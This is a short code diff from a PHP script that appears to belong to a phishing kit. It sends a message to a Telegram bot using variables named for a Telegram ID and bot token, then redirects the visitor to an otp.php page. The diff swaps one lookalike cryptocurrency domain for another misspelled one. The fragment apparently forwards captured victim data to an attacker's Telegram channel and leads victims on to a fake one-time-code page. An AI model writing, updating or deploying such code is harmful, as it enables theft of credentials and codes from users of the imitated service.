@@ -28,5 +28,5 @@ function sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot) {
     curl_close($ch);
 }
 sendMessage($kennesia_telegram_id, $message, $kennesia_token_bot);
-header('Location: https://sidrachain.llink.icu/otp.php');
+header('Location: https://www.sidracoiinmall.site/otp.php');
 ?>
